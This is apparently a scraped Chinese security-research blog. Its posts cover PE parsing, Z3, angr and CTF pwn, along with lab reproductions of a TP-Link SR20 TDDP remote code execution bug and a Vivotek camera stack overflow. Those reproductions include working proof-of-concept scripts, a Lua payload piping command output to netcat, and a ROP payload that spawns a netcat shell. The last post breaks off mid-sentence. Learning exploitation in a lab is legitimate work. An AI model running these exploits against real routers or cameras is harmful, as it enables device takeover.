valueWORD e_sp; // Initial SP valueWORD e_csum; // ChecksumWORD e_ip; // Initial IP valueWORD e_cs; // Initial (relative) CS valueWORD e_lfarlc; // File address of relocation tableWORD e_ovno; // Overlay numberWORD e_res[4]; // Reserved wordsWORD e_oemid; // OEM identifier (for e_oeminfo)WORD e_oeminfo; // OEM information; e_oemid specificWORD e_res2[10]; // Reserved wordsLONG e_lfanew; // File address of new exe header} IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER; 指针有了，结构体内部的数据类型也是清晰的，这边就能在demo中调用相关功能并且输出dos头的信息了，其次是IMAGE_NT_HEADERS,这个结构体中包含三个headers：image_optional_header、image_file_header、image_nt_header,一般来说image_file_header用来定位物理信息，比如可选头大小，节区数目等，而image_optional_header这个可选头一般用来定位内存信息，里面存储着一些RVA比如程序入口点、基地址等等，image_optional_header中的image_data_directory算是比较重要的一个元素，它有记录程序的IAT和EAT还有INT等等，nt_header之后比较重要的一个头是image_section_header部分，它记录着程序中各个节区的地址、偏移、对齐前后分别在文件和内存中的地址，以上这些header以及它们各自的元素是需要有一个比较清晰和熟练的掌握的。那么如何实现呢，刚才说到文件对象映射到内存后获取到了指针，指向dos头，由于dos头元素e_lfanew指向nt_header，所以这里通过一个指针变换操作，将e_lfanew指向的地址保存到一个新的指针中，这个新指针就指向nt_header，同理，nt_header的指针+nt_header的file_header和optional_header的大小就相当于是指向了image_section_header，之后同样的操作，保存section指向的内存句柄，也能对header中的元素进行输出。很多现成的结构体在winnt.h头文件中都有定义，而且还有解释看了一下还是学到不少。之后的导入表导出表、基地址重定位表也是这样的，这里不再详述。最后贴一下源代码图以及程序执行图（今天太困了，想早点睡） 总体来说不算难，就当练练手，下一个项目–valgrind，模仿它的mem_check内存分析做二次开发2333333.","link":"/2019/03/15/PE%E8%A7%A3%E6%9E%90%E5%B7%A5%E5%85%B7%E7%BC%96%E5%86%99/"},{"title":"TP-Link SR20远程代码执行漏洞","text":"0x00 缘起IoT设备，固件小，功能单一，相对操作系统上一些成熟应用程序来说漏洞比较少但是却更容易利用；嵌入式linux环境下的漏洞挖掘类似于对linux的程序做模糊测试，甚至有点类似于CTF中的linux pwn，所以对新人还是相对来说比较友好的。为了拓展自己的学习领域，最终还是踏足了IoT这一块。这边记录下复现这个路由器的代码执行漏洞的过程，熟悉下相关工具&环境的使用和配置。 0x01 漏洞原理12此远程代码执行漏洞允许用户在设备上以 root 权限执行任意命令，该漏洞存在于 TP-Link 设备调试协议(TP-Link Device Debug Protocol 英文简称 TDDP) 中，TDDP 是 TP-Link 申请了专利的调试协议，基于 UDP 运行在 1040 端口TP-Link SR20 设备运行了 V1 版本的 TDDP 协议，V1 版本无需认证，只需往 SR20 设备的 UDP 1040 端口发送数据，且数据的第二字节为 0x31 时，SR20 设备会连接发送该请求设备的 TFTP 服务下载相应的文件并使用 LUA 解释器以 root 权限来执行，这就导致存在远程代码执行漏洞 0x02 工具准备 源码编译qemu，直接apt的话可能安装的不是最新版本 源码编译binwalk，直接apt的话可能 会有依赖问题 0x03 固件提取这边贴一下官网的固件下载页，vuln的固件可以去上面找。tplink的固件留有历史版本还是很良心的，之前分析vivotek摄像头rce漏洞的时候由于官网并没有放出历史版本而导致一直无法对patch的固件进行利用，就很坑。 拿到固件后binwalk看一下包文件布局 binwalk成功识别出了固件中的文件系统，确认是固件文件后再次binwalk -Me提取出固件中的Squashfs filesystem。 qemu来运行程序 直接qemu-arm是不行的，一些依赖库会找不到，需要指定当前目录为根，加入到path中;这边可以chroot，也可以直接用qemu的-L选项。 发现这种方式运行tddp并不能触发漏洞，这边选择搭建完整的arm qemu的虚拟环境。 ##0x04 搭建环境 从debian官网下载qemu的arm debian系统的文件： debian_wheezy_armhf_standard.qcow2 initrd.img-3.2.0-4-vexpress vmlinuz-3.2.0-4-vexpress 之后把三个文件放在一个目录下执行 123$ sudo tunctl -t tap0 -u `whoami` # 为了与 QEMU 虚拟机通信，添加一个虚拟网卡$ sudo ifconfig tap0 10.10.10.1/24 # 为添加的虚拟网卡配置 IP 地址$ qemu-system-arm -M vexpress-a9 -kernel vmlinuz-3.2.0-4-vexpress -initrd initrd.img-3.2.0-4-vexpress -drive if=sd,file=debian_wheezy_armhf_standard.qcow2 -append \"root=/dev/mmcblk0p2 console=ttyAMA0\" -net nic -net tap,ifname=tap0,script=no,downscript=no -nographic 配置网卡ip ifconfig eth0 10.10.10.2/24 发现虚拟机可以与宿主机的虚拟网卡通信了。 现在需要把固件系统传到qemu的arm debian虚拟机中，这边用python的httpserver就好了。 python -m SimpleHttpServer qemu虚拟机上执行wget http://10.10.10.1:8000/squashfs-root.tar.bz2获取宿主机文件。 传好以后需要将当前目录设定为根目录，否则的话有些库会从debian系统的lib目录下去寻找。 123mount -o bind /dev ./squashfs-root/dev/mount -t proc /proc/ ./squashfs-root/proc/chroot squashfs-root sh # 切换根目录后执行新目录结构下的 sh shell 之后在宿主机搭建tftp服务 sudo apt install atftpd 到这边漏洞环境搭建完毕。 0x05 漏洞复现在atftp的根目录/tftpboot写下payload，内容为 123function config_test(config) os.execute(\"id | nc 10.10.10.1 1337\")end QEMU 虚拟机中启动 tddp 程序 宿主机使用 NC 监听端口 执行 POC，获取命令执行结果 123456789101112131415161718192021222324252627282930313233343536373839404142#!/usr/bin/python3# Copyright 2019 Google LLC.# SPDX-License-Identifier: Apache-2.0# Create a file in your tftp directory with the following contents:##function config_test(config)# os.execute(\"telnetd -l /bin/login.sh\")#end## Execute script as poc.py remoteaddr filenameimport sysimport binasciiimport socketport_send = 1040port_receive = 61000tddp_ver = \"01\"tddp_command = \"31\"tddp_req = \"01\"tddp_reply = \"00\"tddp_padding = \"%0.16X\" % 00tddp_packet = \"\".join([tddp_ver, tddp_command, tddp_req, tddp_reply, tddp_padding])sock_receive = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)sock_receive.bind(('', port_receive))# Send a requestsock_send = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)packet = binascii.unhexlify(tddp_packet)argument = \"%s;arbitrary\" % sys.argv[2]packet = packet + argument.encode()sock_send.sendto(packet, (sys.argv[1], port_send))sock_send.close()response, addr = sock_receive.recvfrom(1024)r = response.encode('hex')print(r) nc -lvnp 1337 python3 poc.py 10.10.10.2 /payload","link":"/2019/04/29/TP-Link-SR20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"title":"Vivotek远程栈溢出漏洞分析与复现","text":"0x01 前言2017年11月披露的vivotek的一个栈溢出漏洞，漏洞发生在其固件中的httpd服务，其未对用户post的数据长度做校验，导致攻击者可以发送特定的数据使摄像头进程崩溃，甚至任意代码执行。这边看到后觉得挺有意思的，打算复现下。 贴一下漏洞作者放出的poc ： https://www.exploit-db.com/exploits/44001 再贴一下影响版本 ： 123456789101112131415CC8160 CC8370-HV CC8371-HV CD8371-HNTV CD8371-HNVF2 FD8166AFD8166A-N FD8167A FD8167A-S FD8169A FD8169A-S FD816BA-HF2FD816BA-HT FD816CA-HF2 FD8177-H FD8179-H FD8182-F1 FD8182-F2FD8182-T FD8366-V FD8367A-V FD8369A-V FD836BA-EHTV FD836BA-EHVF2FD836BA-HTV FD836BA-HVF2 FD8377-HV FD8379-HV FD8382-ETV FD8382-EVF2FD8382-TV FD8382-VF2 FD9171-HT FD9181-HT FD9371-EHTV FD9371-HTVFD9381-EHTV FD9381-HTV FE8182 FE9181-H FE9182-H FE9191FE9381-EHV FE9382-EHV FE9391-EV IB8360 IB8360-W IB8367AIB8369A IB836BA-EHF3 IB836BA-EHT IB836BA-HF3 IB836BA-HT IB8377-HIB8379-H IB8382-EF3 IB8382-ET IB8382-F3 IB8382-T IB9371-EHTIB9371-HT IB9381-EHT IB9381-HT IP8160 IP8160-W IP8166IP9171-HP IP9181-H IZ9361-EH MD8563-EHF2 MD8563-EHF4 MD8563-HF2MD8563-HF4 MD8564-EH MD8565-N SD9161-H SD9361-EHL SD9362-EHSD9362-EHL SD9363-EHL SD9364-EH SD9364-EHL SD9365-EHL SD9366-EHSD9366-EHL VS8100-V2 vivotek官网固件下载地址：http://www.vivotek.com/firmware/ 0x02 环境搭建固件下载vivotek官网并没有发布漏洞固件的历史版本，深夜去国外各大网站上去爬贴找资源，然鹅并没有找到，想喷一波，没有固件降级好傻，看到一堆国外友人吐槽不能版本降级。在漏洞发现者的github上找vulnable firmware的过程中看到了有同样诉求的老哥，看来遇到战友了，果断留issue占楼。 看到作者也留言了233333333。 没办法，没有钱买vivotek摄像头，无法通过串口啥的提固件；只能去官网找技术支持，装一波升级固件后无法启动控制台的小可怜~ 客服小姐姐还是很温柔的，固件到手，不忘了再github issue放一波资源。 固件解包拿到固件后binwalk跑一下，发现文件系统在_31.extracted/_rootfs.img.extracted/squashfs-root这个目录下 看到httpd的类型，32位的arm程序，小端，动态链接，而且符号表被裁23333333 服务运行解包以后就能看到漏洞服务httpd了，由于是arm架构，x86不能直接跑，这边用qemu模拟arm环境运行服务。 这边遇到两个坑点，一个是一开始运行httpd的时候会显示gethostbyname::success，然鹅httpd进程并没有成功启动，httpd文件丢ida 这边涉及两个主要函数，一个是gethostname,它获取本机主机名，将结果存放在rlimits变量中；另一个是gethostbyname,这个函数通过rlimits中存放的主机名寻找ip。这边由于固件hostname中的主机名和宿主机中的hostname有冲突，导致gethostbyname并不能正确的找到主机名对应的ip。 这边把宿主机和固件hosts文件中的主机名改成一致就行了。 另一个坑点就比较坑了。改完hostname并不能成功运行，httpd服务启动会报一个Could not open boa.conf for reading的错，同样ida里回溯关键字符串引用，找到如下代码 发现是无法找到/etc/conf.d/boa/boa.conf这个文件，固件目录下看了一下发现/etc中的conf.d是一个软链接，指向../mnt/flash/etc/conf.d 进../mnt/flash/etc/conf.d看了下，发现并没有conf.d文件夹，emmmmmmm 一开始以为是binwalk解包方式不对，导致文件缺失，然鹅windows下用7zip提取依旧是显示缺文件；猜测etc文件是不是存放在其它包里，果不其然……….. 找到对应版本固件的包，将其中的etc文件夹复制到文件系统下的 /mnt/flash/中覆盖原本的etc文件夹。看一下软连接应该是链接正常了，颜色都变了23333333，这下就能成功运行服务了。 调试环境运行漏洞作者提供的poc发现能导致httpd程序崩溃 然鹅，光能让服务崩溃最多只是个dos拒绝服务，我还想进一步的去观察，去看这个漏洞服务是否能被利用。对这个程序的调试应运而生。 调试的话需要搭建qemu虚拟机，贴下arm-debian的qemu镜像地址：https://people.debian.org/~aurel32/qemu/armel/ 开启虚拟机： 123sudo tunctl -t tap0 -u `whoami` #这边新建一张网卡和虚拟机进行通信sudo ifconfig tap0 192.168.2.1/24 #给网卡配置ipqemu-system-arm -M versatilepb -kernel vmlinuz-3.2.0-4-versatile -initrd initrd.img-3.2.0-4-versatile -hda debian_wheezy_armel_standard.qcow2 -append \"root=/dev/sda1\" -net nic -net tap,ifname=tap0,script=no,downscript=no -nographic #启动虚拟机镜像 之后对虚拟机进行一系列配置： 1234sudo mount -o bind /dev ./squashfs-root/dev #将固件文件系统下的dev目录挂载到虚拟机/devsudo mount -t proc /proc ./squashfs-root/proc #将固件文件系统下的proc目录挂载到虚拟机/procifconfig eth0 192.168.2.2/24 #配置虚拟网卡ip 使其能与主机通信chroot ./squashfs-root/ sh #以指定目录为根弹出一个shell 默认/dev和/proc在chroot的时候是不会挂载的，所以这边才需要手动挂载。 这边选择远程调试，因为首先要考虑到arm-debian原生镜像并不带gdb，apt-get下载太慢，交叉编译又很烦，而且更重要的是不太直观。这边其实是想ida远程调的，但是这边并没有用这种方法调，后面说原因。 //其实是尝试过交叉编译的，armgdb还好说，32位的arm-gdbserver压力就比较大了，可能qemu虚拟机撑不住，果断弃坑，用别人的多好，何必重复造轮子(滑稽) 贴下已经编译好的各个平台上的gdb&gdbserver地址：https://github.com/mzpqnxow/gdb-static-cross/tree/master/prebuilt-static 考虑到qemu虚拟机中下载太慢，这边先下到主机用python -m SimpleHttpServer传过去就好了。 之后就可以gdbserver调一下了，这边httpd运行后会显示pid，gdbserver直接attach就好了。 这边虚拟网卡其实最好用桥接，NAT的话ida无法远程调，但是配置桥接网卡还是有点烦的，而且这里没必要，因为这个arm-pwn相对来说还是比较好利用的。所以直接宿主机target remote调了。 0x03 开始调试寻找漏洞点宿主机target remote上去，向服务端口发送poc，发现崩溃，查看崩溃时各寄存器数值并进行栈回溯查看函数调用 由被调试程序崩溃后的寄存器值可以发现，程序返回时的r4、r5、r6、r7、r8、r9、r10、r11以及pc都被poc中的字符串覆写，由于pc指向了无效地址，所以程序报错。 贴下作者的poc： 1echo -en \"POST /cgi-bin/admin/upgrade.cgi HTTP/1.0\\nContent-Length:AAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIXXXX\\n\\r\\n\\r\\n\" | netcat -v 192.168.2.2 80 通过对Content-Length的交叉引用找到漏洞点 这边就是漏洞所在，程序没有对content-length字段进行校验，直接用strcpy把content-length字段的值复制到长度为4的dest数组中。由于没有进行校验，内容长度字段可以任意指定，而dest缓冲区距栈底只有0x38字节，不溢出才怪了。 构造溢出知道了漏洞点的位置以及形成原因，这边来尝试构造一下。需要注意的是，arm下的函数调用的栈布局和x86下是有很大不一样的，函数的返回地址是专门由寄存器LR保存的，这边content-length的长度超过0x38-4字节就会把LR覆盖成其它内容；有关arm的一些东西打算下期写一篇总结下，通过这篇复现还是学到不少arm常识的。 checksec看了下httpd的编译保护来决定通过什么方式利用，这边程序只开启了nx，所以无法直接写shellcode；ret2libc的话是个不错的选择，但前提是vivotek实体机上没有开aslr，否则的话还是要先泄露libc基址，然后再获取一次输入，相对来说会比较烦一点；但是考虑到IoT设备为效率考虑一般是不会开aslr的，所以这边直接通过ret2libc来进行利用。 0x04 漏洞利用利用思路qemu的arm-debian虚拟机中先关闭aslr：echo 0 > /proc/sys/kernel/randomize_va_space 由于没有开启aslr，那么堆栈地址、text&data段地址、libc加载基址都是固定的，并不需要泄露libc基址。 libc基址知道，偏移固定，system函数地址相当于也知道，接下来就是参数的传递问题了。 x86下的函数是通过栈来传参，但是在mips和arm中，会优先通过寄存器传参，有点类似x64，arm中的函数参数优先通过r0-r3进行传递；system函数的参数就存放在r0中，而内容长度是存放在栈上的，所以这边需要一条gadget链来让r0指向栈上指定的内容。 这边选取的gadget如下： 120x00048784 : pop {r1, pc} 0x00016aa4 : mov r0, r1 ; pop {r4, r5, pc} 为什么不直接选pop {r0,pc}，因为pop {r0,pc}对应的地址0x00033100中有截断符\\x00，且libc基址最后也是\\x00，所以用pip {r0,pc}会导致输入中断，无法继续利用。所以这边只能通过先将参数地址传给r1，之后再mov到r0中去。 让r0指向栈上指定的内容，之后再执行system函数就能任意代码执行了。 利用脚本123456789101112131415161718192021#encoding=utf-8#!/usr/bin/pythonfrom pwn import *from os import *libc_base = 0x76f2d000 # libC 库在内存中的加载地址stack_base = 0x7effeb60 # 崩溃时 SP 寄存器的地址libc_elf = ELF('./libuClibc-0.9.33.3-git.so')payload = (0x38 - 4) * 'a' # paddingpayload += p32(0x00048784 + libc_base) # gadget1payload += p32(0x80 + stack_base) # 栈中命令参数地址payload += p32(0x00016aa4 + libc_base) # gadget2payload += (0x8 * 'a') # paddingpayload += p32(libc_elf.symbols['system'] + libc_base) # 内存中 system() 函数地址payload += ('pwd;' * 0x100 + 'nc\\x20-lp2222\\x20-e/bin/sh\\x20>') # 命令参数payload = 'echo -en \"POST /cgi-bin/admin/upgrade.cgi \\nHTTP/1.0\\nContent-Length:{}\\n\\r\\n\\r\\n\" | nc -v 192.168.2.2 80'.format(payload)os.system(payload) 字节码由于复现漏洞的虚拟机中并没有pwntools，所以整理成字节码直接跑，有点硬核233333333 1echo -en \"POST /cgi-bin/admin/upgrade.cgi HTTP/1.0\\nContent-Length:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\\x84\\x57\\xf7\\x76\\xe0\\xeb\\xff\\x7e\\xa4\\x3a\\xf4\\x76aaaaaaaa\\xb0\\x4a\\xf7\\x76pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;nc -lp2222 -e/bin/sh >\\n\\r\\n\\r\\n\" | nc -v 192.168.2.2 80 0x05 复现 通过此漏洞在远端2222端口反弹一个shell，本地nc过去，成功getshell~。 到这边整个复现过程就算结束了，其实调试和运行环境布置在树莓派上应该会更好一点，能ida远程调就爽的一批了。 0x06 总结这次的复现过程真的值得好好去讲讲，去回味，漏洞本身是不难的，只是一个栈溢出，但是在真实环境下，在IoT环境下，它又是那么与众不同。 这次的复现真的让我学会了很多，固件、社工(滑稽)、qemu、远程调试、交叉编译、arm语法，甚至arm-pwn……. 更重要的是，它让我知道了对一个一开始觉得高不可攀无法解决的问题如何起手。 ps:调试阶段的时候玩gdbserver触发了一个double free，先去看看是否有相关的漏洞，没有的话过几天调一波~ xdw 加油加油~","link":"/2019/05/04/Vivotek%E8%BF%9C%E7%A8%8B%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/"},{"title":"Z3初探","text":"0x01 Z3简介12345Z3 is a theorem prover from Microsoft Research. It is licensed under the MIT license.If you are not familiar with Z3, you can start here.Pre-built binaries for releases are available from here, and nightly builds from here.Z3 can be built using Visual Studio, a Makefile or using CMake. It provides bindings for several programming languages.See the release notes for notes on various stable releases of Z3. Z3是微软研究院的一个定理证明工具(SMT求解)，它是根据MIT许可证授权的，能够解决给定约束条件来求解满足值的问题。通常用来检查表达式的逻辑是否满足。 Z3在计算机领域常用于软件验证、逻辑分析等；CTF中常被用于密码学、二进制逆向、符号执行、Fuzz等领域。Angr中就内置了一个Z3约束求解器用来求解满足条件的路径约束。 0x02 安装贴一下gayhub地址：https://github.com/Z3Prover/z3 clone下Z3源码，进入文件目录 1234python scripts/mk_make.py --pythoncd buildmakemake install //bpython真好用，补全还有自动提示，只是循环的时候和低版本的ipython一样不能回到上一行 0x03 常用APISolver()：创建求解器 add()：变量之间增加约束条件 check()：检查约束条件 model()：列出求解结果 Int()：声明一个整形的变量 Real()：声明一个实殊变量 BitVec()：声明一个变量数组 0x04 实例iscc2018 Reverse My_math_is_bad拿到题目首先扔ida看一下，找到主要逻辑 逻辑还是很简单的，输入32个字节大小的字符串，4字节一组转为整形，一共分成8组，前四组后四组满足两个方程组就行了。 大二的时候做这道题的时候用的matlab解的，orz，变量一个一个敲进去，是很烦了，还是Z3方便，一把梭。 逻辑可以说很清晰了，申明变量，建立约束，再整形格式化成字符串就是flag了 贴下脚本： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152from z3 import *from binascii import *import ctypesa=Int('a')b=Int('b')c=Int('c')d=Int('d')s=Solver()s.add(a*b-c*d==2652042832920173142)s.add(3*d+4*c-b-2*a==397958918)s.add(3*a*c-d*b==3345692380376715070)s.add(27*b+a-11*c-d==40179413815)print s.check()print s.model()a=1869639009b=1801073242c=862734414d=829124174flag=''flag=a2b_hex(hex(a)[2:])[::-1]+a2b_hex(hex(b)[2:])[::-1]+a2b_hex(hex(d)[2:])[::-1]+a2b_hex(hex(c)[2:])[::-1]#print flagseed = a ^ b ^ c ^ ddll = ctypes.CDLL(\"/lib/x86_64-linux-gnu/libc.so.6\")dll.srand(seed)v1 = dll.rand() % 50;v2 = dll.rand() % 50;v7 = dll.rand() % 50;v8 = dll.rand() % 50;v9 = dll.rand() % 50;v10 = dll.rand() % 50;v11 = dll.rand() % 50;v12 = dll.rand() % 50;print v1,v2,v7,v8,v9,v10,v11,v12v3 = Int('v3')v4 = Int('v4')v5 = Int('v5')v6 = Int('v6')t = Solver()t.add(v6 * v2 + v3 * v1 - v4 - v5 == 61799700179)t.add(v6 + v3 + v5 * v8 - v4 * v7 == 48753725643)t.add(v3 * v9 + v4 * v10 - v5 - v6 == 59322698861)t.add(v5 * v12 + v3 - v4 - v6 * v11 == 51664230587)t.check()print t.model()v3=811816014v4=828593230v5=1867395930v6=1195788129flag+=a2b_hex(hex(v3)[2:])[::-1]+a2b_hex(hex(v4)[2:])[::-1]+a2b_hex(hex(v5)[2:])[::-1]+a2b_hex(hex(v6)[2:])[::-1]print flag iscc2018 Reverse obfuscation_and_encodemain函数里面函数还是非常清晰的： 发现主要是fencode和encode两个函数，对输入进行加密，之后与固定字符串lUFBuT7hADvItXEGn7KgTEjqw8U5VQUq进行对比，先分析一下fencode函数，分析参数大概能猜出它做的操作。 看cfg发现是控制流平坦化，程序应该是用ollvm混淆过的，一般逻辑贼复杂的那种都是用pin或者angr跑的，但是这题好像混淆后的逻辑并不复杂，给关键代码下断动态调一下： 大致能分析出逻辑：输入24个字节大小的字符串，4个字节分一组，分成6组，每一组与[{2,2,4,-5},{1,1,3,-3},{-1,-2,-3,4},{-1,0,-2,2}]中对应idx的数组进行乘法操作，结果相加。一共生成6组*4数组个大小的字节，也就是24个字节，存入buffer数组中。 之后encode函数，看参数和之后要对比的字符串其实就能猜出来，再看一下逻辑： 根据汇编代码看出是个3转4的操作，确定是base64，看ALPHA_BASE发现已经被替换了。很常见的base64表替换加密，encode的加密就清楚了。 还原出伪代码： 123456for(v12=0;v12","link":"/2019/05/10/Z3%E5%88%9D%E6%8E%A2/"},{"title":"angr初探 一","text":"0x01 angr简介angr是一个基于python的二进制代码分析工具，能够通过符号执行自动完成对二进制文件的分析。早期的符号执行是静态的，依靠分析程序代码来进行工作，之后引入了动态符号执行，通过模拟指令来运行程序，找出控制流。符号执行: 123来自维基百科符号执行 （Symbolic Execution）是一种程序分析技术。其可以通过分析程序来得到让特定代码区域执行的输入。使用符号执行分析一个程序时，该程序会使用符号值作为输入，而非一般执行程序时使用的具体值。在达到目标代码时，分析器可以得到相应的路径约束，然后通过约束求解器来得到可以触发目标代码的具体值。[1]符号模拟技术（symbolic simulation）则把类似的思想用于硬件分析。符号计算（Symbolic computation）则用于数学表达式分析。 angr分析程序过程:1、将二进制文件载入angr分析系统2、将二进制程序语言被VEX IR转换为中间语言(IR)3、将IR转化成语义较强的表达形式，方便进一步的分析4、执行分析(静态分析、程序空间符号探索)5、求解，根据符号建立约束关系(claripy) 0x02 angr安装首先安装依赖库: $ sudo apt-get install python-dev libffi-dev build-essential virtualenvwrapper virtualenvwrapper是一个python虚拟机，使用这个虚拟机的原因主要是angr会修改libz3和libVEX，可能会影响其它程序的正常使用。 创建一个名为angr的虚拟环境: $ virtualenv angr 激活虚拟环境: $ source ~/angr/bin/active 激活虚拟环境以后，终端界面最开头会出现(angr)字样 之后用pip安装angr: $ pip install angr 0x03 angr常用对象 创建Project 设置state 新建符号量:BVS(bitvector symbolic)或BVV(bitvector value) 把符号设置到内存或其它地方 设置simulation managers，进行路径探索 探索(explore) 建立约束关系求解 这里贴一下官方文档 0x04 angr简单使用贴一下angr最基本的使用目标程序地址: https://github.com/angr/angr-doc/tree/master/examples/ais3_crackme 载入ida看一下发现主要是我们逆向这个校验函数: 这个函数本身不复杂，这边手逆也是毫无问题，但如果angr的话，其实可以不用看逻辑，直接跑出来的。 这边贴下脚本: 1234567891011121314151617181920212223242526272829303132333435363738394041#!/usr/bin/env python'''ais3_crackme has been developed by Tyler Nighswander (tylerni7) for ais3.It is an easy crackme challenge. It checks the command line argument.'''import angrimport claripydef main(): project = angr.Project(\"./ais3_crackme\") #把ais3载入angr系统 argv1 = claripy.BVS(\"argv1\",100*8) #因为我们不知道长度，所以这边给100bytes initial_state = project.factory.entry_state(args=[\"./crackme1\",argv1])#获取函数初始化状态 #根据初始化的状态创建一条程序执行路径 sm = project.factory.simulation_manager(initial_state) #符号执行程序，直到我们找到通向我们所期望的值的路径 sm.explore(find=0x400602) #0x400602是指向correct的那条路径 found = sm.found[0] #sm.found表示所有通向我们指定地址的路径，一般来说CTF只会有唯一解，也就是路径只会有一条，所以用found[0] solution = found.solver.eval(argv1, cast_to=bytes)#符号解析器solver对argv1进行解析 print(repr(solution)) solution = solution[:solution.find(b\"\\x00\")] print(solution) return solutiondef test(): res = main() assert res == b\"ais3{I_tak3_g00d_n0t3s}\"if __name__ == '__main__': print(repr(main())) 0x05 局限angr目前还是用在CTF中比较多，它的局限性很大，一旦程序路径过多，限制条件太复杂，由于其是通过遍历路径和约束求解符号，将会消耗大量的时间和内存。","link":"/2019/04/17/angr%E5%88%9D%E6%8E%A2/"},{"title":"2017 0ctf babystack","text":"babystack WP​ 拿到题目扔ida一看发现是一道栈溢出，但开启了nx保护，而程序没有能泄露地址的函数，所以无法利用rop，想了很久。后来查了才知道这题要用return2dl-resolve来做。 ​ return2dl-resolve可以用来绕过aslr和nx，但是由于这种利用相对比较高级，利用起来比较难理解，所以一般情况下是不用这种利用的，比如如果是栈溢出但是题目给了你libc或者有leak函数给你的话，你就可以用rop，没有必要使用ret2dl-resolve，但是如果题目没有给你libc，而且程序中不能leak的话，碰到这种死局一般就要想到要用到ret2dl-resolve。这里说到ret2dl-resolve就不能不介绍一下linux下对可执行程序使用的延迟绑定技术了。 一个动态链接的程序，如果在链接的时候将所有函数都进行解析，那么链接过程花费的时间肯定就长，针对这个缺点，动态链接器只对程序中调用到的libc库函数进行解析定位，那些没有用到的就不用去解析，这样就能提高链接效率，提高程序启动速度了。 一个elf可执行程序，当调用一个函数的时候会根据对应函数got表中的地址调用相应的函数。比如调用plt表中的函数首先会取出对应函数got表中的值，然后做一个跳转，但如果是第一次调用该函数，那么got表中的值是指向plt第二句的，plt的第二句会压入一个偏移，表示该函数在got表中的表项。之后程序会跳到got表起始地址+8处，这里保存着解析函数dl_runtime_resolve，前面会把link_map以及reloc_arg压栈，这样就相当于是执行了_dl_runtime_resolve(link_map,reloc_arg)，这个函数会根据link_map地址和偏移将libc真实地址写入到对应函数got表中。之后调用函数的话就可以直接调用got中保存的地址，不需要plt再去查找并绑定了。 利用方式：控制EIP为PLT[0]的地址，只需传递一个index_arg参数控制index_arg的大小，使reloc的位置落在可控地址内伪造reloc的内容，使sym落在可控地址内伪造sym的内容，使name落在可控地址内伪造name为任意库函数，如system 因为它查找是通过辨识函数字符串的 利用可以说是很复杂了，但是格式基本差不多，github上找到利用脚本，需要roputils扩展。利用脚本： 123456789101112131415161718192021222324252627282930313233from roputils import *fpath = sys.argv[1]offset = int(sys.argv[2])rop = ROP(fpath)addr_bss = rop.section('.bss')buf = rop.retfill(offset)buf += rop.call('read', 0, addr_bss, 100)buf += rop.dl_resolve_call(addr_bss+20, addr_bss)p = Proc(rop.fpath)p.write(p32(len(buf)) + buf)print \"[+] read: %r\" % p.read(len(buf))buf = rop.string('/bin/sh')buf += rop.fill(20, buf)buf += rop.dl_resolve_data(addr_bss+20, 'system')buf += rop.fill(100, buf)p.write(buf)p.interact(0) 这里贴上觉得不错的资料： 12345https://blog.csdn.net/weixin_40850881/article/details/80211762http://www.cnblogs.com/Ox9A82/p/5487275.htmlhttps://zhuanlan.zhihu.com/p/23255727","link":"/2018/07/27/babystack/"},{"title":"ISITDTU CTF 2018 Quals","text":"ISITDTU CTF 2018 Qualsdead_note_lv1 wp​ 拿到题目扔ida一看发现在check的时候没有考虑考虑全面导致输入的index可以为负数，这样就能够导致数组下标越界，引发一些问题，比如用户可以通过构造的index进行覆写got表执行任意指令.但是比较麻烦的是这里只允许用户输入三个字节，超过三个字节输入程序会报big size，输入的数据将不会被写入内存. 然而此时用户已经可以覆写got表了，由于程序是用strlen进行长度判断，那么将strlen函数的got表复写成指定指令，使存储长度的rax寄存器为0就行了，这里可以使用例如xor eax,eax的指令.当复写strlen的got为xor 